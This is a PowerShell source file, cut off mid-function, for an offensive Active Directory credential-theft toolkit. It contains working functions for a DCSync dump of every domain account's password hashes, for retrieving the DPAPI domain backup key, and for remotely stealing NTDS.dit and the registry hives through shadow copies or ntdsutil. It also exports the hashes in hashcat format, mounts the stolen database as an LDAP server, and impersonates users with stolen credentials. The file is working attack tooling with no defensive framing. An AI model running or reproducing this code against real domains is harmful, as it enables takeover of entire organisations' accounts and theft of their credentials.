#requires -version 3

Function Invoke-DCSync {
<#
.SYNOPSIS
    Dump domain accounts from Active Directory.

    Author: Timothee MENOCHET (@_tmenochet)

.DESCRIPTION
    Invoke-DCSync extracts domain accounts from Active Directory via DCSync attack, including password hashes.
    By default, all account objects are returned

.NOTES
    DSInternals powershell module must be installed first:
    PS C:\> Install-Module -Name DSInternals -Scope CurrentUser

.PARAMETER Server
    Specifies the target domain controller.

.PARAMETER Credential
    Specifies the privileged account to use (typically Domain Admin).

.PARAMETER SamAccountName
    Specifies the identifier of an account that will be extracted from Active Directory.
    By default, all domain accounts will be retrieved.

.EXAMPLE
    PS C:\> Invoke-DCSync | Format-Custom -View HashcatNT

.EXAMPLE
    PS C:\> Invoke-DCSync -Server DC.ADATUM.CORP -Credential ADATUM\Administrator -SamAccountName krbtgt
#>

    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Server = $($env:LOGONSERVER -replace '\\'),

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateNotNullOrEmpty()]
        [String]
        $SamAccountName
    )

    # Check if DSInternals module is installed
    if (-Not(Get-Module -Name DSInternals -ListAvailable)) {
        Write-Warning "This command must be launched on a computer with DSInternals PowerShell module installed."
        Write-Warning "Please run command 'Install-Module -Name DSInternals -Scope CurrentUser' first"
        return
    }
    else {
        Import-Module DSInternals
    }

    # Retrieve base DN
    $BaseURI = "LDAP://" + $Server
    $SearchString = $BaseURI + "/RootDSE"
    if ($Credential.UserName) {
        $DomainObject = New-Object System.DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)
    }
    else {
        $DomainObject = New-Object System.DirectoryServices.DirectoryEntry($SearchString)
    }
    $BaseDN = $DomainObject.defaultNamingContext

    if ($SamAccountName) {
        # Retrieve NetBIOS name 
        $SearchString = $BaseURI + "/" + "cn=Partitions," + $DomainObject.configurationNamingContext
        if ($Credential.UserName) {
            $DomainObject = New-Object System.DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            $Searcher = New-Object System.DirectoryServices.DirectorySearcher($DomainObject)
        }
        else {
            $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
        }
        $Searcher.Filter = "(&(objectCategory=crossRef)(ncName=" + $BaseDN + "))"
        $Searcher.SearchScope = "OneLevel";
        $null = $Searcher.PropertiesToLoad.Add("nETBIOSName")
        $Results = $Searcher.FindAll()
        $NetbiosName = $Results[0].Properties["nETBIOSName"]
        $Results.dispose()
        $Searcher.dispose()
        # Dump a specific domain account
        if ($Credential.UserName) {
            Get-ADReplAccount -SamAccountName "$SamAccountName" -Server "$Server" -Domain $NetbiosName -Credential $Credential
        }
        else {
            Get-ADReplAccount -SamAccountName "$SamAccountName" -Server "$Server" -Domain $NetbiosName
        }
    }
    else {
        # Dump all domain accounts
        if ($Credential.UserName) {
            Get-ADReplAccount -All -NamingContext "$BaseDN" -Server "$Server" -Credential $Credential
        }
        else {
            Get-ADReplAccount -All -NamingContext "$BaseDN" -Server "$Server"
        }
    }
}

Function Get-DpapiBackupKey {
<#
.SYNOPSIS
    Get the DPAPI backup key from an Active Directory domain controller.

    Author: Timothee MENOCHET (@_tmenochet)

.DESCRIPTION
    Get-DpapiBackupKey retrieves the DPAPI backup key through various methods and saved it to the local file system.

.NOTES
    DSInternals powershell module must be installed first:
    PS C:\> Install-Module -Name DSInternals -Scope CurrentUser

.PARAMETER Server
    Specifies the target domain controller.

.PARAMETER Credential
    Specifies the privileged account to use (typically Domain Admin).

.PARAMETER Method
    Specifies the method to use, defaults to 'MS-DRSR'.

.PARAMETER OutputDirectory
    Specifies the target directory for local copy.

.EXAMPLE
    PS C:\> Get-DpapiBackupKey -OutputDirectory $Env:TEMP

.EXAMPLE
    PS C:\> Get-DpapiBackupKey -Server DC.ADATUM.CORP -Credential ADATUM\Administrator -Method MS-LSAD
#>

    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Server = $($env:LOGONSERVER -replace '\\'),

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('MS-DRSR', 'MS-LSAD')]
        [String]
        $Method = 'MS-DRSR',

        [ValidateNotNullOrEmpty()]
        [String]
        $OutputDirectory = "."
    )

    Begin {
        # Check if DSInternals module is installed
        if (-Not(Get-Module -Name DSInternals -ListAvailable)) {
            Write-Warning "This command must be launched on a computer with DSInternals PowerShell module installed."
            Write-Warning "Please run command 'Install-Module -Name DSInternals -Scope CurrentUser' first"
            return
        }
        else {
            Import-Module DSInternals
        }
    }

    Process {
        if ($Method -eq 'MS-DRSR') {
            # Use MS-DRSR protocol aka directory replication
            try {
                # Retrieve the DNS name of the target Active Directory domain
                $searchString = "LDAP://$Server/RootDSE"
                $rootDSE = New-Object DirectoryServices.DirectoryEntry($searchString, $null, $null)
                $defaultNC = $rootDSE.defaultNamingContext[0]
                $adsPath = "LDAP://$Server/$defaultNC"
                $domain = $defaultNC -replace 'DC=' -replace ',','.'
            }
            catch {
                Write-Error "Domain controller unreachable" -ErrorAction Stop
            }
            try {
                if ($Credential.UserName) {
                    $backupKey = Get-ADReplBackupKey -Server $Server -Domain $domain -Protocol TCP -Credential $Credential
                }
                else {
                    $backupKey = Get-ADReplBackupKey -Server $Server -Domain $domain -Protocol TCP
                }
            }
            catch {
                Write-Error $_ -ErrorAction Stop
            }
        }
        else {
            # Use MS-LSAD protocol aka LSARPC
            if ($Credential.Username) {
                $logonToken = Invoke-UserImpersonation -Credential $Credential
            }
            try {
                $backupKey = Get-LsaBackupKey -ComputerName $Server
            }
            catch {
                Write-Error $_ -ErrorAction Stop
            }
        }

        $backupKey = $backupKey | Where-Object {$_.Type -eq 'RSAKey'}
        $backupKey | Save-DPAPIBlob -DirectoryPath $OutputDirectory
        Remove-Item "$OutputDirectory\kiwiscript.txt"
        Write-Output $backupKey
    }

    End {
        if ($logonToken) {
            Invoke-RevertToSelf -TokenHandle $logonToken
        }
    }
}

Function Get-ADDatabase {
<#
.SYNOPSIS
    Steal Active Directory database remotely.

    Author: Timothee MENOCHET (@_tmenochet)

.DESCRIPTION
    Get-ADDatabase makes a copy of the NTDS.dit file and related hives from a remote domain controller.

.PARAMETER Server
    Specifies the target domain controller.

.PARAMETER Credential
    Specifies the privileged account to use (typically Domain Admin).

.PARAMETER Protocol
    Specifies the transport protocol to use, defaults to 'Dcom'.

.PARAMETER Method
    Specifies the copy method to use, defaults to 'ShadowCopy'.

.PARAMETER OutputDirectory
    Specifies the target directory for local copy.

.EXAMPLE
    PS C:\> Get-ADDatabase -OutputDirectory $Env:TEMP

.EXAMPLE
    PS C:\> Get-ADDatabase -Server DC.ADATUM.CORP -Credential ADATUM\Administrator -Protocol Wsman -Method NtdsUtil
#>

    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Server = $($env:LOGONSERVER -replace '\\'),

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('Dcom', 'Wsman')]
        [String]
        $Protocol = 'Dcom',

        [ValidateSet('NtdsUtil', 'ShadowCopy')]
        [String]
        $Method = 'ShadowCopy',

        [ValidateNotNullOrEmpty()]
        [String]
        $OutputDirectory = "."
    )

    BEGIN {
        $cimOption = New-CimSessionOption -Protocol $Protocol
        $psOption = New-PSSessionOption -NoMachineProfile
        if ($Credential.Username) {
            $cimSession = New-CimSession -ComputerName $Server -Credential $Credential -SessionOption $cimOption -ErrorAction Stop
            if ($Protocol -eq 'Wsman') {
                $psSession = New-PSSession -ComputerName $Server -Credential $Credential -SessionOption $psOption
            }
        }
        else {
            $cimSession = New-CimSession -ComputerName $Server -SessionOption $cimOption -ErrorAction Stop
            if ($Protocol -eq 'Wsman') {
                $psSession = New-PSSession -ComputerName $Server -SessionOption $psOption
            }
        }
    }

    PROCESS {

        if ($Method -eq 'NtdsUtil') {
            Write-Host "[*] Identifying the operating system version of $Server"
            $OS = Get-CimInstance -ClassName Win32_OperatingSystem -CimSession $cimSession
            if ($OS.Version[0] -lt 6) {
                Write-Warning "ShadowCopy method not supported by the target host."
                return
            }

            Write-Host "[*] Creating NTDS copy using ntdsutil.exe"
            $tempDir = "C:\Windows\Temp\dump"
            $process = Invoke-CimMethod -ClassName Win32_Process -Name create -Arguments @{CommandLine="cmd.exe /c ntdsutil `"ac in ntds`" i `"cr fu $tempDir`" q q"} -CimSession $cimSession
            do {
                Start-Sleep -m 250
            }
            until ((Get-CimInstance -ClassName Win32_Process -Filter "ProcessId='$($process.ProcessId)'" -CimSession $cimSession | Where {$_.Name -eq "cmd.exe"}).ProcessID -eq $null)

            Write-Host "[*] Copying the NTDS file and registry hives into $(Resolve-Path $OutputDirectory)"
            if ($Protocol -eq 'Wsman') {
                # Download files via PSRemoting
                Copy-Item -Recurse -Path "$tempDir" -Destination "$OutputDirectory" -FromSession $psSession
            }
            else {
                # Download files via SMB
                if ($Credential.Username) {
                    $drive = "S"
                    New-PSDrive -Name $drive -Root "\\$Server\C$" -Credential $Credential -PSProvider "FileSystem" | Out-Null
                    Copy-Item -Recurse -Path $($tempDir -Replace "C:","${drive}:") -Destination "$OutputDirectory"
                    Remove-PSDrive $drive
                }
                else {
                    Copy-Item -Recurse -Path "\\$Server\$($tempDir -Replace ":","$")" -Destination "$OutputDirectory"
                }
            }

            # Delete the temporary directory
            Write-Host "[*] Cleaning up remote file copies"
            Get-CimInstance -ClassName Win32_Directory -Filter "Name='$($tempDir -Replace '\\','\\')'" -CimSession $cimSession | Remove-CimInstance
        }
        else {
            if ($Credential.Username -and $Protocol -eq 'Dcom') {
                $logonToken = Invoke-UserImpersonation -Credential $Credential
            }

            Write-Host "[*] Grabbing the location of the ntds.dit file on $Server"
            [uint32]$HKLM = 2147483650
            $key = "SYSTEM\\CurrentControlSet\\Services\\NTDS\Parameters"
            $value = "DSA Database File"
            $ditPath = (Invoke-CimMethod -ClassName StdRegProv -Name GetStringValue -Arguments @{hDefKey=$HKLM; sSubKeyName=$key; sValueName=$value} -CimSession $cimSession).sValue
            $ditRelativePath = $ditPath.Split('\')[1..($ditPath.Split('\').Length - 1)] -Join '\'
            $edbRelativePath = "$($ditPath.Split('\')[1..($ditPath.Split('\').Length - 2)] -Join '\')\edb.log"
            $ditDrive = $ditPath.Split("\")[0]

            Write-Host "[*] Creating a shadow copy of volume '$ditDrive\'"
            $process = Invoke-CimMethod -ClassName Win32_ShadowCopy -Name Create -Arguments @{Context="ClientAccessible"; Volume="$ditDrive\"} -CimSession $cimSession
            $shadowCopy = Get-CimInstance -ClassName Win32_ShadowCopy -Filter "ID='$($process.ShadowID)'" -CimSession $cimSession

            Write-Host "[*] Copying the NTDS file into $(Resolve-Path $OutputDirectory)"
            if ($Protocol -eq 'Wsman') {
                $deviceObject = $shadowCopy.DeviceObject.ToString()
                $tempDir = "C:\Windows\Temp\dump"
                $process = Invoke-CimMethod -ClassName Win32_Process -Name create -Arguments @{CommandLine="cmd.exe /c mklink `"$tempDir`" `"$deviceObject`""} -CimSession $cimSession
                do {
                    Start-Sleep -m 250
                }
                until ((Get-CimInstance -ClassName Win32_process -Filter "ProcessId='$($process.ProcessId)'" -CimSession $cimSession -Verbose:$false | Where {$_.Name -eq "cmd.exe"}).ProcessID -eq $null)

                # Download files via PSRemoting
                $ditBackupPath = "$tempDir\$ditRelativePath"
                $edbBackupPath = "$tempDir\$edbRelativePath"
                Copy-Item -Path "$ditBackupPath" -Destination "$OutputDirectory" -FromSession $psSession
                Copy-Item -Path "$edbBackupPath" -Destination "$OutputDirectory" -FromSession $psSession
            }
            else {
                # Adapted from https://gist.github.com/jborean93/f60da33b08f8e1d5e0ef545b0a4698a0
                # Create a SafeFileHandle of the UNC path
                $handle = [ADThief.Win32]::CreateFileW(
                    "\\$Server\$($ditDrive -Replace ':','$')",
                    [Security.AccessControl.FileSystemRights]"ListDirectory",
                    [IO.FileShare]::ReadWrite,
                    [IntPtr]::Zero,
                    [IO.FileMode]::Open,
                    0x02000000,
                    [IntPtr]::Zero
                )
                if ($handle.IsInvalid) {
                    Write-Error -Message "CreateFileW failed"
                }
                # Invoke NtFsControlFile to access the snapshots
                $transDataSize = [Runtime.InteropServices.Marshal]::SizeOf([Type][ADThief.Win32+NT_Trans_Data])
                $bufferSize = $transDataSize + 4
                $outBuffer = [Runtime.InteropServices.Marshal]::AllocHGlobal($bufferSize)
                $ioBlock = New-Object -TypeName ADThief.Win32+IO_STATUS_BLOCK
                [ADThief.Win32]::NtFsControlFile($handle, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [Ref]$ioBlock, 0x00144064, [IntPtr]::Zero, 0, $outBuffer, $bufferSize) | Out-Null

                # Download files via SMB
                $shadowPath = $shadowCopy.InstallDate.ToUniversalTime().ToString("'@GMT-'yyyy.MM.dd-HH.mm.ss")
                $ditBackupPath = "\\$Server\$($ditDrive -Replace ':', '$')\$shadowPath\$ditRelativePath"
                $edbBackupPath = "\\$Server\$($ditDrive -Replace ':', '$')\$shadowPath\$edbRelativePath"
                Copy-Item -Path "$ditBackupPath" -Destination "$OutputDirectory"
                Copy-Item -Path "$edbBackupPath" -Destination "$OutputDirectory"
            }

            if ($ditDrive -ne 'C:') {
                if ($Protocol -eq 'Wsman') {
                    # Delete the previous shadow link
                    Get-CimInstance -ClassName CIM_LogicalFile -Filter "Name='$($tempDir -Replace '\\','\\')'" -CimSession $cimSession | Remove-CimInstance
                }
                else {
                    # Close the previous handle
                    $handle.Dispose()
                }

                # Delete the previous shadow copy
                $shadowCopy | Remove-CimInstance

                Write-Host "[*] Creating a shadow copy of volume 'C:\'"
                $process = Invoke-CimMethod -ClassName Win32_ShadowCopy -Name Create -Arguments @{Context="ClientAccessible"; Volume="C:\"} -CimSession $cimSession
                $shadowCopy = Get-CimInstance -ClassName Win32_ShadowCopy -Filter "ID='$($process.ShadowID)'" -CimSession $cimSession

                if ($Protocol -eq 'Wsman') {
                    $deviceObject = $shadowCopy.DeviceObject.ToString()
                    $tempDir = "C:\Windows\Temp\dump"
                    $process = Invoke-CimMethod -ClassName Win32_Process -Name create -Arguments @{CommandLine="cmd.exe /c mklink $tempDir $deviceObject"} -CimSession $cimSession
                    do {
                        Start-Sleep -m 250
                    }
                    until ((Get-CimInstance -ClassName Win32_process -Filter "ProcessId='$($process.ProcessId)'" -CimSession $cimSession | Where {$_.Name -eq "cmd.exe"}).ProcessID -eq $null)
                }
                else {
                    # Create a SafeFileHandle of the UNC path
                    $handle = [ADThief.Win32]::CreateFileW(
                        "\\$Server\C$",
                        [Security.AccessControl.FileSystemRights]"ListDirectory",
                        [IO.FileShare]::ReadWrite,
                        [IntPtr]::Zero,
                        [IO.FileMode]::Open,
                        0x02000000,
                        [IntPtr]::Zero
                    )
                    if ($handle.IsInvalid) {
                        Write-Error -Message "CreateFileW failed"
                    }
                    # Invoke NtFsControlFile to access the snapshots
                    $transDataSize = [Runtime.InteropServices.Marshal]::SizeOf([Type][ADThief.Win32+NT_Trans_Data])
                    $bufferSize = $transDataSize + 4
                    $outBuffer = [Runtime.InteropServices.Marshal]::AllocHGlobal($bufferSize)
                    $ioBlock = New-Object -TypeName ADThief.Win32+IO_STATUS_BLOCK
                    [ADThief.Win32]::NtFsControlFile($handle, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [Ref]$ioBlock, 0x00144064, [IntPtr]::Zero, 0, $outBuffer, $bufferSize) | Out-Null
                }
            }

            Write-Host "[*] Copying the registry hives into $(Resolve-Path $OutputDirectory)"
            if ($Protocol -eq 'Wsman') {
                # Download files via PSRemoting
                $ditBackupPath = "$tempDir\Windows\System32\config\SYSTEM"
                $edbBackupPath = "$tempDir\Windows\System32\config\SECURITY"
                Copy-Item -Path "$ditBackupPath" -Destination "$OutputDirectory" -FromSession $psSession
                Copy-Item -Path "$edbBackupPath" -Destination "$OutputDirectory" -FromSession $psSession

                # Delete the shadow link
                Get-CimInstance -ClassName CIM_LogicalFile -Filter "Name='$($tempDir -Replace '\\','\\')'" -CimSession $cimSession | Remove-CimInstance
            }
            else {
                # Download files via SMB
                $shadowPath = $shadowCopy.InstallDate.ToUniversalTime().ToString("'@GMT-'yyyy.MM.dd-HH.mm.ss")
                $systemBackupPath = "\\$Server\C$\$shadowPath\Windows\System32\config\SYSTEM"
                $securityBackupPath = "\\$Server\C$\$shadowPath\Windows\System32\config\SECURITY"
                Copy-Item -Path "$systemBackupPath" -Destination "$OutputDirectory"
                Copy-Item -Path "$securityBackupPath" -Destination "$OutputDirectory"

                # Close the handle
                $handle.Dispose()
            }

            Write-Host "[*] Cleaning up the shadow copy"
            $shadowCopy | Remove-CimInstance
        }
    }

    END {
        Remove-CimSession -CimSession $cimSession
        if ($Protocol -eq 'Wsman') {
            Remove-PSSession -Session $psSession
        }

        if ($logonToken) {
            Invoke-RevertToSelf -TokenHandle $logonToken
        }
    }
}

Function Dump-ADDatabase {
<#
.SYNOPSIS
    Dump domain accounts from an offline Active Directory database.

    Author: Timothee MENOCHET (@_tmenochet)

.DESCRIPTION
    Dump-ADDatabase extracts domain accounts from NTDS database and SYSTEM hive files, including password hashes.
    By default, all account objects are returned.

.NOTES
    DSInternals powershell module must be installed first:
    PS C:\> Install-Module -Name DSInternals

.PARAMETER SystemHiveFilePath
    Specifies the path to an offline SYSTEM registry hive.

.PARAMETER DatabasePath
    Specifies the path to an offline NTDS database.

.PARAMETER SamAccountName
    Specifies the identifier of an account that will be extracted from the database.
    By default, all domain accounts will be retrieved.

.EXAMPLE
    PS C:\> Dump-ADDatabase | Format-Custom -View HashcatNT | Out-File -Encoding ascii ADATUM.hashes

.EXAMPLE
    PS C:\> Dump-ADDatabase -DatabasePath C:\Windows\Temp\ntds.dit -SystemHiveFilePath C:\Windows\Temp\SYSTEM -SamAccountName krbtgt
#>

    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $DatabasePath = ".\ntds.dit",

        [ValidateNotNullOrEmpty()]
        [String]
        $SystemHiveFilePath = ".\SYSTEM",

        [ValidateNotNullOrEmpty()]
        [String]
        $SamAccountName
    )

    # Check if DSInternals module is installed
    if (-Not(Get-Module -Name DSInternals -ListAvailable)) {
        Write-Warning "This command must be launched on a computer with DSInternals PowerShell module installed."
        Write-Warning "Please run command 'Install-Module -Name DSInternals -Scope CurrentUser' first"
        return
    }
    else {
        Import-Module DSInternals
    }

    # Check if user is elevated
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent())
    if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) {
        Write-Warning "This command must be launched as an Administrator" 
        return
    }

    # Read the Boot Key from the SYSTEM registry hive
    $key = Get-BootKey -SystemHiveFilePath "$SystemHiveFilePath"

    # Read one or more accounts from the ntds.dit file
    if ($SamAccountName) {
        Get-ADDBAccount -SamAccountName "$SamAccountName" -DatabasePath "$DatabasePath" -BootKey $key
    }
    else {
        Get-ADDBAccount -All -DatabasePath "$DatabasePath" -BootKey $key
    }
}

Function Mount-ADDatabase {
<#
.SYNOPSIS
    Mount an Active Directory database locally.

    Author: Timothee MENOCHET (@_tmenochet)

.DESCRIPTION
    Mount-ADDatabase exposes a NTDS database file as a Lightweight Directory Access Protocol (LDAP) server using DSAMain.exe.
    Database can then be queried using Invoke-LdapSearch or PowerView.

.NOTES
    Local administrative privileges are required.
    Moreover, Active Directory Lightweight Directory Services (AD LDS) must be installed first:
    # Windows Server
    PS C:\> Enable-WindowsOptionalFeature -FeatureName "DirectoryServices-ADAM" -Online
    # Windows Workstation
    PS C:\> Enable-WindowsOptionalFeature -FeatureName "DirectoryServices-ADAM-Client" -Online

.PARAMETER DatabasePath
    Specifies the path to the database file.

.PARAMETER AllowUpgrade
    Allows NTDS.dit upgrade, which is required to mount a database file from an earlier version of Windows (default: false).

.PARAMETER LdapPort
    Specifies the listening port for the LDAP service.

.EXAMPLE
    PS C:\> Mount-ADDatabase

.EXAMPLE
    PS C:\> Mount-ADDatabase -DatabasePath C:\Windows\Temp\ntds.dit -AllowUpgrade -LdapPort 1389
#>

    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $DatabasePath = ".\ntds.dit",

        [switch]
        $AllowUpgrade = $false,

        [ValidateRange(1025,65535)]
        [Int32]
        $LdapPort = 3266
    )

    # Check if dsamain.exe is in the PATH
    if ((Get-Command dsamain.exe -ErrorAction SilentlyContinue) -eq $null) {
        Write-Warning "This command must be launched on a computer with AD LDS installed"
        return
    }

    # Check if user is elevated
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent())
    if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) {
        Write-Warning "This command must be launched as an Administrator" 
        return
    }

    Write-Host "[*] Mounting NTDS database as a LDAP server"
    if ($AllowUpgrade) {
        $Options = '-allowNonAdminAccess -allowUpgrade'
    }
    else {
        $Options = '-allowNonAdminAccess'
    }
    $DSAMain = Start-Process -FilePath dsamain.exe -ArgumentList "-dbpath $DatabasePath -ldapPort $LdapPort $Options" -PassThru -WindowStyle 1
    Start-Sleep -Seconds 3
    if (-Not(Get-Process dsamain -ErrorAction SilentlyContinue)) {
        Write-Warning "An error occured, retry with another port for LDAP server. If the error persist, please try the option 'AllowUpgrade' after backing up the database file"
    }
    elseif (-Not((Test-NetConnection -ComputerName localhost -Port $LdapPort -ErrorAction SilentlyContinue).TcpTestSucceeded)) {
        Write-Warning "An error occured, retry with option 'AllowUpgrade' after backing up the database file"
        Umount-ADDatabase
    }
    else {
        Write-Host "[*] LDAP server listening on port $LdapPort"
        Write-Host "[!] Run command 'Umount-ADDatabase' to stop"
    }
}

Function Umount-ADDatabase {
    Get-Process dsamain -ErrorAction SilentlyContinue | Stop-Process
}

Function Local:Get-LdapRootDSE {
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [Switch]
        $SSL
    )

    $searchString = "LDAP://$Server/RootDSE"
    if ($SSL) {
        # Note that the server certificate has to be trusted
        $authType = [DirectoryServices.AuthenticationTypes]::SecureSocketsLayer
    }
    else {
        $authType = [DirectoryServices.AuthenticationTypes]::Anonymous
    }
    $rootDSE = New-Object DirectoryServices.DirectoryEntry($searchString, $null, $null, $authType)
    return $rootDSE
}

Function Local:Get-LdapObject {
<#
.SYNOPSIS
    Search for domain objects in Active Directory.

    Author: Timothee MENOCHET (@_tmenochet)

.DESCRIPTION
    Get-LdapObject searches for objects matching a custom LDAP filter.
    By default, all account objects for the target directory are returned.
    Uses LDAP protocol for compatibility with NTDS databases exposed through Mount-ADDatabase.

.PARAMETER Server
    Specifies the LDAP server to query.

.PARAMETER SSL
    Use SSL connection to LDAP server.

.PARAMETER SearchBase
    Specifies the base distinguished name to search through.

.PARAMETER SearchScope
    Specifies the scope to search under, defaults to 'Subtree'.

.PARAMETER Filter
    Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties
    Specifies the properties of the output object to retrieve, defaults to * (all).

.PARAMETER PageSize
    Specifies the maximum number of result to return, defaults to 200.

.PARAMETER Credential
    Specifies the domain account to use.

.EXAMPLE
    PS C:\> $baseDN = (Get-LdapRootDSE -Server "localhost:3266").defaultNamingContext[0]
    PS C:\> Get-LdapObject -Server "localhost:3266" -SearchBase $baseDN -Filter "(objectClass=person)" -Properties sAMAccountName
#>
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [Switch]
        $SSL,

        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [String]
        $SearchScope = 'Subtree',

        [ValidateNotNullOrEmpty()]
        [String]
        $Filter = '(objectClass=*)',

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties = '*',

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    try {
        if ($SSL) {
            $results = @()
            $rootDSE = Get-LdapRootDSE -Server $Server
            $defaultNC = $rootDSE.defaultNamingContext[0]
            $domain = $defaultNC -replace 'DC=' -replace ',','.'
            [Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
            $searcher = New-Object -TypeName System.DirectoryServices.Protocols.LdapConnection -ArgumentList "$($Server):636"
            $searcher.SessionOptions.SecureSocketLayer = $true
            $searcher.SessionOptions.VerifyServerCertificate = {$true}
            $searcher.SessionOptions.DomainName = $domain
            $searcher.AuthType = [DirectoryServices.Protocols.AuthType]::Negotiate
            if ($Credential.UserName) {
                $searcher.Bind($Credential)
            }
            else {
                $searcher.Bind()
            }
            $request = New-Object -TypeName System.DirectoryServices.Protocols.SearchRequest
            $request.DistinguishedName = $SearchBase
            $request.Scope = $SearchScope
            $pageRequestControl = New-Object -TypeName System.DirectoryServices.Protocols.PageResultRequestControl -ArgumentList $PageSize
            $request.Controls.Add($pageRequestControl) | Out-Null
            $request.Filter = $Filter
            $response = $searcher.SendRequest($request)
            while ($true) {
                $response = $searcher.SendRequest($request)
                if ($response.ResultCode -eq 'Success') {
                    foreach ($entry in $response.Entries) {
                        $results += $entry
                    }
                }
                $pageResponseControl = [DirectoryServices.Protocols.PageResultResponseControl]$response.Controls[0]
                if ($pageResponseControl.Cookie.Length -eq 0) {
                    break
                }
                $pageRequestControl.Cookie = $pageResponseControl.Cookie
            }
            
        }
        else {
            $adsPath = "LDAP://$Server/$SearchBase"
            if ($Credential.UserName) {
                $domainObject = New-Object DirectoryServices.DirectoryEntry($adsPath, $Credential.UserName, $Credential.GetNetworkCredential().Password)
                $searcher = New-Object DirectoryServices.DirectorySearcher($domainObject)
            }
            else {
                $searcher = New-Object DirectoryServices.DirectorySearcher([ADSI]$adsPath)
            }
            $searcher.SearchScope = $SearchScope
            $searcher.PageSize = $PageSize
            $searcher.CacheResults = $false
            $searcher.filter = $Filter
            $propertiesToLoad = $Properties | ForEach-Object {$_.Split(',')}
            $searcher.PropertiesToLoad.AddRange($propertiesToLoad) | Out-Null
            $results = $searcher.FindAll()
        }
    }
    catch {
        Write-Error $_ -ErrorAction Stop
    }
    $results | Where-Object {$_} | ForEach-Object {
        if (Get-Member -InputObject $_ -name "Attributes" -Membertype Properties) {
            # Convert DirectoryAttribute object (LDAPS results)
            $p = @{}
            foreach ($a in $_.Attributes.Keys | Sort-Object) {
                if (($a -eq 'objectsid') -or ($a -eq 'sidhistory') -or ($a -eq 'objectguid') -or ($a -eq 'securityidentifier') -or ($a -eq 'msds-allowedtoactonbehalfofotheridentity') -or ($a -eq 'usercertificate') -or ($a -eq 'ntsecuritydescriptor') -or ($a -eq 'logonhours')) {
                    $p[$a] = $_.Attributes[$a]
                }
                elseif ($a -eq 'dnsrecord') {
                    $p[$a] = ($_.Attributes[$a].GetValues([byte[]]))[0]
                }
                else {
                    $values = @()
                    foreach ($v in $_.Attributes[$a].GetValues([byte[]])) {
                        $values += [Text.Encoding]::UTF8.GetString($v)
                    }
                    $p[$a] = $values
                }
            }
        }
        else {
            $p = $_.Properties
        }
        $objectProperties = @{}
        $p.Keys | ForEach-Object {
            if (($_ -ne 'adspath') -and ($p[$_].count -eq 1)) {
                $objectProperties[$_] = $p[$_][0]
            }
            elseif ($_ -ne 'adspath') {
                $objectProperties[$_] = $p[$_]
            }
        }
        New-Object -TypeName PSObject -Property ($objectProperties)
    }
    if (-not $SSL) {
        $results.dispose()
    }
    $searcher.dispose()
}

# Adapted from PowerView by @harmj0y and @mattifestation
Function Local:Invoke-UserImpersonation {
    [OutputType([IntPtr])]
    [CmdletBinding(DefaultParameterSetName = 'Credential')]
    Param(
        [Parameter(Mandatory = $True, ParameterSetName = 'Credential')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential,

        [Parameter(Mandatory = $True, ParameterSetName = 'TokenHandle')]
        [ValidateNotNull()]
        [IntPtr]
        $TokenHandle,

        [Switch]
        $Quiet
    )

    if (([Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not $PSBoundParameters['Quiet'])) {
        Write-Warning "[UserImpersonation] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work."
    }

    if ($PSBoundParameters['TokenHandle']) {
        $LogonTokenHandle = $TokenHandle
    }
    else {
        $LogonTokenHandle = [IntPtr]::Zero
        $NetworkCredential = $Credential.GetNetworkCredential()
        $UserDomain = $NetworkCredential.Domain
        $UserName = $NetworkCredential.UserName
        Write-Verbose "[UserImpersonation] Executing LogonUser() with user: $($UserDomain)\$($UserName)"

        if (-not [ADThief.Win32]::LogonUserA($UserName, $UserDomain, $NetworkCredential.Password, 9, 3, [ref]$LogonTokenHandle)) {
            $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            throw "[UserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
        }
    }

    if (-not [ADThief.Win32]::ImpersonateLoggedOnUser($LogonTokenHandle)) {
        throw "[UserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
    }
    $LogonTokenHandle
}

Function Local:Invoke-RevertToSelf {
    [CmdletBinding()]
    Param(
